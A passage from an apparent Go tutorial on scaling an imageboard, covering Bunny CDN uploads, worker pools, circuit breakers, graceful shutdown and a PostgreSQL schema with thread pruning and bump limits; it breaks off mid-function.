func (um *UploadManager) UpdateTaskStatus(taskID, status string, progress int) {
	um.mu.Lock()
	defer um.mu.Unlock()

	if task, exists := um.tasks[taskID]; exists {
		task.Status = status
		task.Progress = progress

		if status == "complete" || status == "failed" {
			task.CompletedAt = time.Now()
		}
	}
}

// CompleteTask marks task as complete with URL
func (um *UploadManager) CompleteTask(taskID, url string) {
	um.mu.Lock()
	defer um.mu.Unlock()

	if task, exists := um.tasks[taskID]; exists {
		task.Status = "complete"
		task.Progress = 100
		task.URL = url
		task.CompletedAt = time.Now()
	}
}

// FailTask marks task as failed
func (um *UploadManager) FailTask(taskID string, err error) {
	um.mu.Lock()
	defer um.mu.Unlock()

	if task, exists := um.tasks[taskID]; exists {
		task.Status = "failed"
		task.Error = err.Error()
		task.CompletedAt = time.Now()
	}
}

// CleanupOldTasks removes tasks older than 1 hour
func (um *UploadManager) CleanupOldTasks() {
	um.mu.Lock()
	defer um.mu.Unlock()

	cutoff := time.Now().Add(-1 * time.Hour)

	for id, task := range um.tasks {
		if task.CompletedAt.Before(cutoff) && !task.CompletedAt.IsZero() {
			delete(um.tasks, id)
		}
	}
}

// ProcessUploadAsync processes an image upload asynchronously
func ProcessUploadAsync(taskID string, data []byte, filename, contentType string) {
	// Update status to uploading
	uploadManager.UpdateTaskStatus(taskID, "uploading", 10)

	// Upload to Bunny CDN
	url, err := UploadImageToBunny(filename, data, contentType)

	if err != nil {
		uploadManager.FailTask(taskID, err)
		log.Printf("Upload task %s failed: %v", taskID, err)
		return
	}

	// Complete the task
	uploadManager.CompleteTask(taskID, url)
	log.Printf("Upload task %s completed: %s", taskID, url)
}
```

**Add periodic cleanup in main.go:**

```go
// Clean up old upload tasks every 30 minutes
go func() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		uploadManager.CleanupOldTasks()
	}
}()
```

**Add upload status endpoint:**

```go
// In main.go, add route:
http.HandleFunc("/upload-status", UploadStatusHandler)

// In handlers.go:
func UploadStatusHandler(w http.ResponseWriter, r *http.Request) {
	taskID := r.URL.Query().Get("task_id")
	if taskID == "" {
		http.Error(w, "Missing task_id", http.StatusBadRequest)
		return
	}

	task, exists := uploadManager.GetUploadTask(taskID)
	if !exists {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(task)
}
```

### Step 8: Update Handler to Use Async Upload

**Update NewThreadHandler:**

```go
// Handle file upload
var uploadTaskID string
file, handler, err := r.FormFile("image")
if err == nil && handler != nil {
    defer file.Close()

    // Validate the image first
    err = ValidateImage(file, handler)
    if err != nil {
        http.Error(w, "Invalid image file: "+err.Error(), http.StatusBadRequest)
        return
    }

    // Read file data
    buffer := make([]byte, handler.Size)
    _, err := file.Read(buffer)
    if err != nil {
        http.Error(w, "Error reading uploaded file", http.StatusInternalServerError)
        return
    }

    // Determine content type
    contentType := "image/jpeg"
    if bytes.HasPrefix(buffer, []byte{0x89, 0x50, 0x4E, 0x47}) {
        contentType = "image/png"
    } else if bytes.HasPrefix(buffer, []byte{0x47, 0x49, 0x46}) {
        contentType = "image/gif"
    }

    // Generate unique filename
    safeFilename := filepath.Base(handler.Filename)
    filename := fmt.Sprintf("%d_%s", time.Now().UnixNano(), safeFilename)

    // Create upload task
    uploadTaskID = uploadManager.CreateUploadTask(filename)

    // Start async upload (doesn't block!)
    go ProcessUploadAsync(uploadTaskID, buffer, filename, contentType)

    // Use a placeholder URL initially
    // The image will be updated once upload completes
    imagePath = fmt.Sprintf("/uploading?task_id=%s", uploadTaskID)
}

// Create thread immediately (doesn't wait for upload!)
thread, err := CreateThread(boardID, title, content, imagePath, ipAddress)
// ... rest of handler
```

**Add handler for placeholder images:**

```go
func UploadingImageHandler(w http.ResponseWriter, r *http.Request) {
	taskID := r.URL.Query().Get("task_id")

	task, exists := uploadManager.GetUploadTask(taskID)
	if !exists {
		http.Error(w, "Upload not found", http.StatusNotFound)
		return
	}

	if task.Status == "complete" {
		// Redirect to actual image
		http.Redirect(w, r, task.URL, http.StatusTemporaryRedirect)
		return
	}

	// Return a "processing" image
	// You can create a simple SVG placeholder
	w.Header().Set("Content-Type", "image/svg+xml")
	fmt.Fprintf(w, `<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
		<rect width="200" height="200" fill="#f0f0f0"/>
		<text x="50%%" y="50%%" text-anchor="middle" fill="#333">
			Uploading... %d%%
		</text>
	</svg>`, task.Progress)
}
```

### Step 9: Migration Script (Move Existing Images)

Create `migrate_images_to_bunny.go`:

```go
package main

import (
	"fmt"
	"log"
	"strings"
)

// MigrateImagesToBunny migrates existing images from Redis to Bunny CDN
func MigrateImagesToBunny() error {
	log.Println("Starting image migration from Redis to Bunny CDN...")

	// Get all image keys from Redis
	keys, err := rdb.Keys(ctx, "image:*").Result()
	if err != nil {
		return err
	}

	log.Printf("Found %d images to migrate", len(keys))

	successCount := 0
	failCount := 0

	for i, key := range keys {
		// Get image data from Redis
		data, err := rdb.Get(ctx, key).Bytes()
		if err != nil {
			log.Printf("Error reading %s: %v", key, err)
			failCount++
			continue
		}

		// Extract filename from key (remove "image:" prefix)
		filename := strings.TrimPrefix(key, "image:")

		// Determine content type
		contentType := "image/jpeg"
		if bytes.HasPrefix(data, []byte{0x89, 0x50, 0x4E, 0x47}) {
			contentType = "image/png"
		} else if bytes.HasPrefix(data, []byte{0x47, 0x49, 0x46}) {
			contentType = "image/gif"
		}

		// Upload to Bunny CDN
		url, err := UploadImageToBunny(filename, data, contentType)
		if err != nil {
			log.Printf("Error uploading %s to Bunny: %v", filename, err)
			failCount++
			continue
		}

		log.Printf("[%d/%d] Migrated %s -> %s", i+1, len(keys), filename, url)
		successCount++

		// Optional: Delete from Redis after successful upload
		// rdb.Del(ctx, key)

		// Sleep to avoid rate limiting
		time.Sleep(100 * time.Millisecond)
	}

	log.Printf("Migration complete! Success: %d, Failed: %d", successCount, failCount)
	return nil
}
```

Run migration:
```bash
# Add to main.go temporarily:
// if os.Args contains "-migrate"
if len(os.Args) > 1 && os.Args[1] == "-migrate-bunny" {
	MigrateImagesToBunny()
	return
}

go run . -migrate-bunny
```

### Step 10: Add Client-Side Progress Indicator

**In your thread template:**

```html
<img src="{{.ImagePath}}"
     class="post-image"
     data-upload-task="{{if contains .ImagePath "uploading"}}true{{end}}"
     alt="Post image">

<script>
// Poll for upload completion
document.querySelectorAll('img[data-upload-task="true"]').forEach(img => {
    const url = new URL(img.src);
    const taskId = url.searchParams.get('task_id');

    if (taskId) {
        const checkStatus = () => {
            fetch(`/upload-status?task_id=${taskId}`)
                .then(r => r.json())
                .then(task => {
                    if (task.status === 'complete') {
                        img.src = task.url;
                        img.removeAttribute('data-upload-task');
                    } else if (task.status === 'failed') {
                        img.alt = 'Upload failed';
                        img.removeAttribute('data-upload-task');
                    } else {
                        // Still uploading, check again in 2 seconds
                        setTimeout(checkStatus, 2000);
                    }
                });
        };

        checkStatus();
    }
});
</script>
```

### Cost Comparison

**Before (Redis):**
```
10GB images in Redis: $100/month
100GB images in Redis: $1,000/month
1TB images in Redis: $10,000/month
```

**After (Bunny CDN):**
```
10GB images: $0.10/month storage + ~$1/month bandwidth = $1.10/month
100GB images: $1/month storage + ~$3/month bandwidth = $4/month
1TB images: $10/month storage + ~$20/month bandwidth = $30/month
```

**Savings:**
- 10GB: 99% reduction ($100 → $1.10)
- 100GB: 99.6% reduction ($1,000 → $4)
- 1TB: 99.7% reduction ($10,000 → $30)

### Performance Comparison

**Before (Redis):**
```
Image load time (same region): 50ms
Image load time (cross-region): 50ms (no CDN!)
Upload time: 100-300ms (to your server)
```

**After (Bunny CDN):**
```
Image load time (any region): 20-50ms (nearest CDN node)
Upload time: 100-300ms (to Bunny)
CDN cache hit: 10-20ms
```

### What You Learned

✅ Why CDN storage is better than Redis for static files
✅ How to integrate with Bunny CDN API
✅ Synchronous vs asynchronous upload patterns
✅ How to handle upload timeouts gracefully
✅ Client-side progress indicators for better UX
✅ Cost optimization strategies (99%+ savings!)
✅ How to migrate data between storage systems

---

## 5. Proper Concurrency & Timeout Handling

### Why This Matters

**The Problem:**
Your application handles multiple requests concurrently, but without proper handling:
- One slow operation can block others
- Long-running tasks can cause timeouts
- Resource leaks from abandoned goroutines
- Race conditions in shared data
- Crashes from panics in goroutines

**Real-world scenario that crashes your site:**
1. User uploads huge image (10MB)
2. Bunny CDN is slow (10 seconds to upload)
3. Meanwhile, 100 other users try to load pages
4. All requests wait for database connections
5. Connection pool exhausted
6. Site becomes unresponsive
7. **Site effectively down**

### Step 1: Understanding Go Concurrency Primitives

**Key concepts:**

```go
// Goroutine: Lightweight thread
go doSomething() // Runs concurrently

// Channel: Communication between goroutines
ch := make(chan string)
go func() { ch <- "result" }()
result := <-ch

// Context: Cancellation and timeouts
ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()

// WaitGroup: Wait for multiple goroutines
var wg sync.WaitGroup
wg.Add(1)
go func() {
    defer wg.Done()
    doWork()
}()
wg.Wait() // Blocks until all Done() called

// Mutex: Protect shared data
var mu sync.Mutex
mu.Lock()
sharedData++
mu.Unlock()
```

### Step 2: Create Worker Pool for Image Processing

Create `worker_pool.go`:

```go
package main

import (
	"context"
	"fmt"
	"log"
	"sync"
	"time"
)

// ImageJob represents an image processing job
type ImageJob struct {
	ID          string
	Data        []byte
	Filename    string
	ContentType string
	ResultChan  chan ImageJobResult
}

// ImageJobResult holds the result of processing
type ImageJobResult struct {
	URL   string
	Error error
}

// WorkerPool manages concurrent image uploads
type WorkerPool struct {
	workerCount int
	jobQueue    chan ImageJob
	wg          sync.WaitGroup
	ctx         context.Context
	cancel      context.CancelFunc
}

// NewWorkerPool creates a new worker pool
func NewWorkerPool(workerCount int, queueSize int) *WorkerPool {
	ctx, cancel := context.WithCancel(context.Background())

	pool := &WorkerPool{
		workerCount: workerCount,
		jobQueue:    make(chan ImageJob, queueSize),
		ctx:         ctx,
		cancel:      cancel,
	}

	// Start workers
	for i := 0; i < workerCount; i++ {
		pool.wg.Add(1)
		go pool.worker(i)
	}

	return pool
}

// worker processes jobs from the queue
func (wp *WorkerPool) worker(id int) {
	defer wp.wg.Done()

	log.Printf("Worker %d started", id)

	for {
		select {
		case <-wp.ctx.Done():
			log.Printf("Worker %d shutting down", id)
			return

		case job, ok := <-wp.jobQueue:
			if !ok {
				log.Printf("Worker %d: job queue closed", id)
				return
			}

			wp.processJob(id, job)
		}
	}
}

// processJob processes a single job with panic recovery
func (wp *WorkerPool) processJob(workerID int, job ImageJob) {
	// Recover from panics to prevent worker crash
	defer func() {
		if r := recover(); r != nil {
			log.Printf("Worker %d: panic processing job %s: %v", workerID, job.ID, r)
			job.ResultChan <- ImageJobResult{
				Error: fmt.Errorf("internal error processing image"),
			}
		}
	}()

	log.Printf("Worker %d: processing job %s", workerID, job.ID)

	// Create timeout context for this job
	ctx, cancel := context.WithTimeout(wp.ctx, 60*time.Second)
	defer cancel()

	// Upload with timeout
	url, err := UploadImageToBunnyWithContext(ctx, job.Filename, job.Data, job.ContentType)

	// Send result
	job.ResultChan <- ImageJobResult{
		URL:   url,
		Error: err,
	}

	log.Printf("Worker %d: completed job %s", workerID, job.ID)
}

// Submit adds a job to the queue
// Returns immediately with a result channel
func (wp *WorkerPool) Submit(job ImageJob) error {
	select {
	case wp.jobQueue <- job:
		return nil
	case <-wp.ctx.Done():
		return fmt.Errorf("worker pool shutting down")
	case <-time.After(5 * time.Second):
		return fmt.Errorf("job queue full, try again later")
	}
}

// Shutdown gracefully shuts down the worker pool
func (wp *WorkerPool) Shutdown(timeout time.Duration) error {
	log.Println("Shutting down worker pool...")

	// Stop accepting new jobs
	close(wp.jobQueue)

	// Create timeout for shutdown
	shutdownComplete := make(chan struct{})

	go func() {
		wp.wg.Wait()
		close(shutdownComplete)
	}()

	select {
	case <-shutdownComplete:
		log.Println("Worker pool shutdown complete")
		return nil
	case <-time.After(timeout):
		wp.cancel() // Force cancel remaining jobs
		return fmt.Errorf("shutdown timeout exceeded")
	}
}

// Global worker pool
var imageUploadPool *WorkerPool

// InitWorkerPool initializes the global worker pool
func InitWorkerPool() {
	// 5 concurrent workers, queue size 100
	imageUploadPool = NewWorkerPool(5, 100)
}

// ShutdownWorkerPool gracefully shuts down the worker pool
func ShutdownWorkerPool() error {
	if imageUploadPool != nil {
		return imageUploadPool.Shutdown(30 * time.Second)
	}
	return nil
}
```

### Step 3: Update Bunny Upload with Context Support

**Add to bunny_storage.go:**

```go
// UploadImageToBunnyWithContext uploads with context for cancellation
func UploadImageToBunnyWithContext(ctx context.Context, filename string, data []byte, contentType string) (string, error) {
	// Check if context already cancelled
	select {
	case <-ctx.Done():
		return "", ctx.Err()
	default:
	}

	uploadURL := fmt.Sprintf("https://storage.bunnycdn.com/%s/%s",
		bunnyStorageZone,
		filename)

	req, err := http.NewRequestWithContext(ctx, "PUT", uploadURL, bytes.NewReader(data))
	if err != nil {
		return "", fmt.Errorf("failed to create upload request: %w", err)
	}

	req.Header.Set("AccessKey", bunnyAPIKey)
	req.Header.Set("Content-Type", contentType)

	resp, err := bunnyClient.Do(req)
	if err != nil {
		// Check if it was a timeout
		if ctx.Err() == context.DeadlineExceeded {
			return "", fmt.Errorf("upload timeout exceeded")
		}
		return "", fmt.Errorf("failed to upload to Bunny: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("bunny upload failed with status %d: %s", resp.StatusCode, string(body))
	}

	publicURL := fmt.Sprintf("https://%s/%s", bunnyHostname, filename)

	return publicURL, nil
}
```

### Step 4: Update Handler to Use Worker Pool

**Update NewThreadHandler:**

```go
// Handle file upload using worker pool
var imageURL string
file, handler, err := r.FormFile("image")
if err == nil && handler != nil {
    defer file.Close()

    // Validate first
    err = ValidateImage(file, handler)
    if err != nil {
        http.Error(w, "Invalid image file: "+err.Error(), http.StatusBadRequest)
        return
    }

    // Read file data
    buffer := make([]byte, handler.Size)
    _, err := file.Read(buffer)
    if err != nil {
        http.Error(w, "Error reading uploaded file", http.StatusInternalServerError)
        return
    }

    // Determine content type
    contentType := "image/jpeg"
    if bytes.HasPrefix(buffer, []byte{0x89, 0x50, 0x4E, 0x47}) {
        contentType = "image/png"
    } else if bytes.HasPrefix(buffer, []byte{0x47, 0x49, 0x46}) {
        contentType = "image/gif"
    }

    // Generate unique filename
    safeFilename := filepath.Base(handler.Filename)
    filename := fmt.Sprintf("%d_%s", time.Now().UnixNano(), safeFilename)

    // Submit job to worker pool
    resultChan := make(chan ImageJobResult, 1)
    job := ImageJob{
        ID:          filename,
        Data:        buffer,
        Filename:    filename,
        ContentType: contentType,
        ResultChan:  resultChan,
    }

    err = imageUploadPool.Submit(job)
    if err != nil {
        http.Error(w, "Server busy, please try again", http.StatusServiceUnavailable)
        return
    }

    // Wait for upload to complete with timeout
    select {
    case result := <-resultChan:
        if result.Error != nil {
            log.Printf("Image upload failed: %v", result.Error)
            http.Error(w, "Image upload failed", http.StatusInternalServerError)
            return
        }
        imageURL = result.URL

    case <-time.After(30 * time.Second):
        // Upload taking too long, but don't fail the post
        // Store placeholder and let it complete in background
        imageURL = "/images/processing.png"
        log.Printf("Image upload timeout, using placeholder")
    }
}
```

### Step 5: Add Graceful Shutdown

**Update main.go:**

```go
import (
	"context"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func main() {
	// ... existing initialization ...

	// Initialize worker pool
	InitWorkerPool()

	// Set up graceful shutdown
	server := &http.Server{
		Addr:         ":" + port,
		Handler:      handler,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Start server in goroutine
	go func() {
		log.Printf("Server starting on http://localhost:%s", port)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server failed: %v", err)
		}
	}()

	// Wait for interrupt signal
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	log.Println("Shutting down server...")

	// Create shutdown context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Shutdown HTTP server
	if err := server.Shutdown(ctx); err != nil {
		log.Printf("Server forced to shutdown: %v", err)
	}

	// Shutdown worker pool
	if err := ShutdownWorkerPool(); err != nil {
		log.Printf("Worker pool shutdown error: %v", err)
	}

	// Flush logs
	LoggerSync()

	log.Println("Server stopped gracefully")
}
```

### Step 6: Add Circuit Breaker for External Services

Create `circuit_breaker.go`:

```go
package main

import (
	"errors"
	"sync"
	"time"
)

var ErrCircuitOpen = errors.New("circuit breaker is open")

// CircuitBreaker prevents cascading failures
type CircuitBreaker struct {
	maxFailures  int
	resetTimeout time.Duration

	mu            sync.RWMutex
	failures      int
	lastFailTime  time.Time
	state         string // "closed", "open", "half-open"
}

// NewCircuitBreaker creates a new circuit breaker
func NewCircuitBreaker(maxFailures int, resetTimeout time.Duration) *CircuitBreaker {
	return &CircuitBreaker{
		maxFailures:  maxFailures,
		resetTimeout: resetTimeout,
		state:        "closed",
	}
}

// Call executes a function with circuit breaker protection
func (cb *CircuitBreaker) Call(fn func() error) error {
	cb.mu.Lock()

	// Check if we should transition from open to half-open
	if cb.state == "open" {
		if time.Since(cb.lastFailTime) > cb.resetTimeout {
			cb.state = "half-open"
			cb.failures = 0
		} else {
			cb.mu.Unlock()
			return ErrCircuitOpen
		}
	}

	cb.mu.Unlock()

	// Execute function
	err := fn()

	cb.mu.Lock()
	defer cb.mu.Unlock()

	if err != nil {
		cb.failures++
		cb.lastFailTime = time.Now()

		if cb.failures >= cb.maxFailures {
			cb.state = "open"
			log.Printf("Circuit breaker opened after %d failures", cb.failures)
		}

		return err
	}

	// Success - reset if we were half-open
	if cb.state == "half-open" {
		cb.state = "closed"
		cb.failures = 0
		log.Println("Circuit breaker closed after successful call")
	}

	return nil
}

// State returns the current state
func (cb *CircuitBreaker) State() string {
	cb.mu.RLock()
	defer cb.mu.RUnlock()
	return cb.state
}

// Global circuit breakers
var (
	bunnyCircuitBreaker     *CircuitBreaker
	recaptchaCircuitBreaker *CircuitBreaker
)

// InitCircuitBreakers initializes circuit breakers
func InitCircuitBreakers() {
	// Open circuit after 5 failures, reset after 30 seconds
	bunnyCircuitBreaker = NewCircuitBreaker(5, 30*time.Second)
	recaptchaCircuitBreaker = NewCircuitBreaker(10, 60*time.Second)
}
```

**Use circuit breaker for Bunny uploads:**

```go
func UploadImageToBunnyWithCircuitBreaker(ctx context.Context, filename string, data []byte, contentType string) (string, error) {
	var url string
	var uploadErr error

	err := bunnyCircuitBreaker.Call(func() error {
		url, uploadErr = UploadImageToBunnyWithContext(ctx, filename, data, contentType)
		return uploadErr
	})

	if err == ErrCircuitOpen {
		return "", fmt.Errorf("image service temporarily unavailable, please try again later")
	}

	return url, uploadErr
}
```

### Step 7: Add Request Timeout Middleware

```go
// TimeoutMiddleware adds timeout to all requests
func TimeoutMiddleware(timeout time.Duration) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Create context with timeout
			ctx, cancel := context.WithTimeout(r.Context(), timeout)
			defer cancel()

			// Replace request context
			r = r.WithContext(ctx)

			// Create channel to signal handler completion
			done := make(chan struct{})

			go func() {
				next.ServeHTTP(w, r)
				close(done)
			}()

			select {
			case <-done:
				// Handler completed successfully
				return

			case <-ctx.Done():
				// Timeout occurred
				log.Printf("Request timeout: %s %s", r.Method, r.URL.Path)
				http.Error(w, "Request timeout", http.StatusGatewayTimeout)
			}
		})
	}
}
```

**Apply in main.go:**

```go
// Add timeout middleware (30 seconds for all requests)
handler = TimeoutMiddleware(30 * time.Second)(handler)
```

### Step 8: Test Concurrency

**Load test script** `load_test.sh`:

```bash
#!/bin/bash

# Test concurrent uploads
echo "Testing concurrent image uploads..."

for i in {1..20}; do
  (
    curl -X POST http://localhost:8080/new-thread \
      -F "board_id=1" \
      -F "title=Load Test $i" \
      -F "content=Testing concurrent uploads" \
      -F "image=@test-image.jpg" \
      -F "g-recaptcha-response=test" \
      -w "\nRequest $i: %{http_code} in %{time_total}s\n"
  ) &
done

# Wait for all background jobs
wait

echo "Load test complete"
```

**Monitor performance:**

```bash
# Check server metrics
curl http://localhost:8080/metrics

# Watch worker pool
# Add debug endpoint to see queue size:
http.HandleFunc("/debug/workers", func(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Queue size: %d\n", len(imageUploadPool.jobQueue))
    fmt.Fprintf(w, "Circuit breaker state: %s\n", bunnyCircuitBreaker.State())
})
```

### Concurrency Patterns Summary

**Pattern 1: Worker Pool**
- Use for: Limiting concurrent external API calls
- Benefit: Prevents overwhelming external services
- Example: Image uploads to Bunny CDN

**Pattern 2: Circuit Breaker**
- Use for: Protecting against cascading failures
- Benefit: Fails fast when service is down
- Example: Bunny CDN, reCAPTCHA API

**Pattern 3: Timeouts**
- Use for: Every external call
- Benefit: Prevents resource leaks
- Example: HTTP requests, database queries

**Pattern 4: Graceful Shutdown**
- Use for: Production deployments
- Benefit: No dropped requests during restart
- Example: Server shutdown, worker pool cleanup

### What You Learned

✅ How to use worker pools to limit concurrency
✅ Context-based cancellation and timeouts
✅ Circuit breakers for fault tolerance
✅ Graceful shutdown procedures
✅ Panic recovery in goroutines
✅ Proper resource cleanup
✅ How to prevent your site from crashing under load

---

## 6. Migrate to PostgreSQL-Primary Architecture (Imageboard Thread Lifecycle)

### Why This Matters

Traditional imageboards like 4chan embrace **ephemeral content** where old threads naturally die as new content pushes them out. This isn't just a design choice—it's core to imageboard culture and has practical benefits.

**Current Architecture:**
- Redis = Primary storage for threads/posts (expensive, risky)
- PostgreSQL = Board metadata only
- No thread limits = unbounded database growth
- No bump limits = threads live forever
- No auto-pruning = manual cleanup required

**Problems:**
1. **Redis as primary storage**: Designed for caching, not durability
2. **Data loss risk**: AOF can corrupt, Redis crashes lose data
3. **Expensive at scale**: Redis memory ~$10/GB/month
4. **Unbounded growth**: Threads accumulate forever
5. **Stale content**: Dead threads clutter boards
6. **No referential integrity**: Can't enforce FK constraints

**New Architecture (Imageboard Philosophy):**
- PostgreSQL = Primary storage for all data (threads, posts, boards)
- Redis = Cache layer only (5-minute TTL)
- Thread limits per board (typically 150-200 threads)
- Bump limits per thread (typically 300-500 posts)
- Auto-pruning when limits exceeded
- CASCADE deletes maintain integrity

**Benefits:**
✅ **Durability**: PostgreSQL ACID guarantees
✅ **Cost**: 10x cheaper storage (disk vs RAM)
✅ **Fresh content**: Old threads automatically pruned
✅ **Bounded growth**: Database size stays predictable
✅ **Imageboard authenticity**: Ephemeral content like real imageboards
✅ **Better queries**: SQL JOINs, indexes, full-text search

### Understanding Imageboard Thread Lifecycle

```
┌──────────────────────────────────────────────────────────┐
│                  Thread Lifecycle                         │
└──────────────────────────────────────────────────────────┘

1. Thread Created
   ↓
2. Posts bump thread (updated_at = NOW())
   ↓
3. Thread reaches bump limit (300 posts)
   ↓
4. Posts no longer bump (updated_at frozen)
   ↓
5. New threads push it down
   ↓
6. Falls off board (position > thread_limit)
   ↓
7. Thread auto-pruned (deleted)
```

**Example: /b/ board with thread_limit=150, bump_limit=300**

| Time | Event | Thread Position | Status |
|------|-------|----------------|--------|
| 10:00 AM | Thread created | #1 (newest) | Active |
| 10:30 AM | Gets 50 posts | #1 (bumped) | Active |
| 2:00 PM | Reaches 300 posts | #5 | At bump limit |
| 2:05 PM | Gets post #301 | #5 | **No bump** (saged) |
| 3:00 PM | Other threads bump past it | #50 | Falling |
| 5:00 PM | More new threads created | #151 | **Pruned!** |

### Step 1: Update Database Schema

Create `migrations/001_imageboard_limits.sql`:

```sql
-- Add imageboard settings to boards table
ALTER TABLE boards
ADD COLUMN IF NOT EXISTS thread_limit INTEGER NOT NULL DEFAULT 150;

ALTER TABLE boards
ADD COLUMN IF NOT EXISTS bump_limit INTEGER NOT NULL DEFAULT 300;

-- Update existing threads table
ALTER TABLE threads
ADD COLUMN IF NOT EXISTS title VARCHAR(255);

ALTER TABLE threads
ADD COLUMN IF NOT EXISTS updated_at TIMESTAMP NOT NULL DEFAULT NOW();

ALTER TABLE threads
ADD COLUMN IF NOT EXISTS post_count INTEGER NOT NULL DEFAULT 0;

ALTER TABLE threads
ADD COLUMN IF NOT EXISTS is_pinned BOOLEAN NOT NULL DEFAULT FALSE;

ALTER TABLE threads
ADD COLUMN IF NOT EXISTS is_locked BOOLEAN NOT NULL DEFAULT FALSE;

-- Create posts table (primary storage)
CREATE TABLE IF NOT EXISTS posts (
    id SERIAL PRIMARY KEY,
    thread_id INTEGER NOT NULL REFERENCES threads(id) ON DELETE CASCADE,
    content TEXT NOT NULL,
    image_path VARCHAR(255),
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    user_id VARCHAR(8),
    country_code CHAR(2)
);

-- Performance indexes
CREATE INDEX IF NOT EXISTS idx_threads_board_updated
ON threads(board_id, updated_at DESC);

CREATE INDEX IF NOT EXISTS idx_threads_board_pinned
ON threads(board_id, is_pinned DESC, updated_at DESC);

CREATE INDEX IF NOT EXISTS idx_posts_thread_created
ON posts(thread_id, created_at ASC);
```

Apply migration:
```bash
docker exec -it imageboard-postgres psql -U imageboard -d imageboard -f /path/to/migrations/001_imageboard_limits.sql
```

### Step 2: Implement Auto-Pruning

Add to `models.go`:

```go
// PruneOldThreads removes oldest threads when board exceeds limit
func PruneOldThreads(boardID int) error {
	// Get board settings
	var threadLimit int
	err := db.QueryRow(`
		SELECT thread_limit FROM boards WHERE id = $1
	`, boardID).Scan(&threadLimit)
	if err != nil {
		return err
	}

	// Count non-pinned threads
	var threadCount int
	err = db.QueryRow(`
		SELECT COUNT(*)
		FROM threads
		WHERE board_id = $1 AND is_pinned = FALSE
	`, boardID).Scan(&threadCount)
	if err != nil {
		return err
	}

	// If at/over limit, prune oldest threads
	if threadCount >= threadLimit {
		threadsToDelete := threadCount - threadLimit + 1

		// Get oldest thread IDs (by updated_at, excluding pinned)
		rows, err := db.Query(`
			SELECT id
			FROM threads
			WHERE board_id = $1 AND is_pinned = FALSE
			ORDER BY updated_at ASC
			LIMIT $2
		`, boardID, threadsToDelete)
		if err != nil {
			return err
		}
		defer rows.Close()

		// Collect thread IDs to delete
		var threadIDs []int
		for rows.Next() {
			var threadID int
			rows.Scan(&threadID)
			threadIDs = append(threadIDs, threadID)
		}

		// Delete threads (CASCADE deletes posts automatically)
		for _, threadID := range threadIDs {
			_, err = db.Exec("DELETE FROM threads WHERE id = $1", threadID)
			if err != nil {
				log.Printf("Error pruning thread %d: %v", threadID, err)
			} else {
				log.Printf("✂️  Pruned thread %d from board %d (fell off board)", threadID, boardID)
			}
		}
	}

	return nil
}
```

### Step 3: Implement Bump Limits

Add to `models.go`:

```go
// CreatePostPG creates a post in PostgreSQL with bump limit logic
func CreatePostPG(threadID int, content, imagePath, ipAddress string) (int, error) {
	// Get thread and board info
	var boardID, postCount, bumpLimit int
	var isLocked bool
	err := db.QueryRow(`
		SELECT t.board_id, t.post_count, t.is_locked, b.bump_limit
		FROM threads t
		JOIN boards b ON t.board_id = b.id
		WHERE t.id = $1
	`, threadID).Scan(&boardID, &postCount, &isLocked, &bumpLimit)
	if err != nil {
		return 0, fmt.Errorf("thread not found: %v", err)
	}

	if isLocked {
		return 0, fmt.Errorf("thread is locked")
	}

	// Start transaction
	tx, err := db.Begin()
	if err != nil {
		return 0, err
	}
	defer tx.Rollback()

	// Generate user ID and country code
	userID := GenerateUserID(ipAddress, threadID)
	countryCode := GetCountryCode(ipAddress)

	// Insert post
	var postID int
	err = tx.QueryRow(`
		INSERT INTO posts (thread_id, content, image_path, user_id, country_code, created_at)
		VALUES ($1, $2, $3, $4, $5, NOW())
		RETURNING id
	`, threadID, content, imagePath, userID, countryCode).Scan(&postID)
	if err != nil {
		return 0, err
	}

	// Update thread post count
	_, err = tx.Exec(`
		UPDATE threads SET post_count = post_count + 1 WHERE id = $1
	`, threadID)
	if err != nil {
		return 0, err
	}

	// Bump thread ONLY if under bump limit
	if postCount < bumpLimit {
		_, err = tx.Exec(`
			UPDATE threads SET updated_at = NOW() WHERE id = $1
		`, threadID)
		if err != nil {
			return 0, err
		}
		log.Printf("⬆️  Thread %d bumped (post %d/%d)", threadID, postCount+1, bumpLimit)
	} else {
		log.Printf("💤 Thread %d NOT bumped (over limit: %d/%d) - saged", threadID, postCount+1, bumpLimit)
	}

	// Commit transaction
	err = tx.Commit()
	return postID, err
}
```

### Step 4: Update Thread Creation

Add to `models.go`:

```go
// CreateThreadPG creates a thread in PostgreSQL with auto-pruning
func CreateThreadPG(boardID int, title, content, imagePath, ipAddress string) (int, error) {
	// FIRST: Prune old threads if needed
	err := PruneOldThreads(boardID)
	if err != nil {
		log.Printf("⚠️  Pruning warning: %v", err)
		// Continue anyway - don't fail thread creation
	}

	// Start transaction
	tx, err := db.Begin()
	if err != nil {
		return 0, err
	}
	defer tx.Rollback()

	// Create thread
	var threadID int
	err = tx.QueryRow(`
		INSERT INTO threads (board_id, title, created_at, updated_at, post_count, is_pinned, is_locked)
		VALUES ($1, $2, NOW(), NOW(), 0, FALSE, FALSE)
		RETURNING id
	`, boardID, title).Scan(&threadID)
	if err != nil {
		return 0, err
	}

	// Create initial post (OP)
	userID := GenerateUserID(ipAddress, threadID)
	countryCode := GetCountryCode(ipAddress)

	_, err = tx.Exec(`
		INSERT INTO posts (thread_id, content, image_path, user_id, country_code, created_at)
		VALUES ($1, $2, $3, $4, $5, NOW())
	`, threadID, content, imagePath, userID, countryCode)
	if err != nil {
		return 0, err
	}

	// Update thread post count
